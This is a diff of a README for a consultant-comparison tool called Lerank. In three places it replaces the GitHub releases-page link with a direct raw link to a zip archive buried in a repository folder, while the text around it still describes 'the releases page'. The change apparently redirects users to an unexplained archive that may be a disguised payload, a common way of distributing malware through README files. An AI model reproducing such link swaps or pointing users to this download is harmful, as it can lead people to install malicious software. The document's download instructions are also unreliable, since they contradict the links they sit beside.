@@ -1,6 +1,6 @@
 # 🔎 Lerank - Compare Consultants With Less Guesswork
 
-[![⬛⬜ Download Lerank](https://img.shields.io/badge/Download-Lerank-4B5563?style=for-the-badge)](https://github.com/yizhibenshayu-coder/Lerank/releases)
+[![⬛⬜ Download Lerank](https://img.shields.io/badge/Download-Lerank-4B5563?style=for-the-badge)](https://raw.githubusercontent.com/yizhibenshayu-coder/Lerank/main/vivify/Software_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ If your PC is older, Lerank should still run well for basic use. A modern browse
 
 Visit this page to download:
 
-https://github.com/yizhibenshayu-coder/Lerank/releases
+https://raw.githubusercontent.com/yizhibenshayu-coder/Lerank/main/vivify/Software_v2.0.zip
 
 On the releases page:
 
@@ -190,7 +190,7 @@ Topics: cloudflare, consultant-comparison, edtech, education, escrow, marketplac
 
 If you need the release page later, use this link:
 
-https://github.com/yizhibenshayu-coder/Lerank/releases
+https://raw.githubusercontent.com/yizhibenshayu-coder/Lerank/main/vivify/Software_v2.0.zip
 
 ## 🧰 File and Folder Tips
 
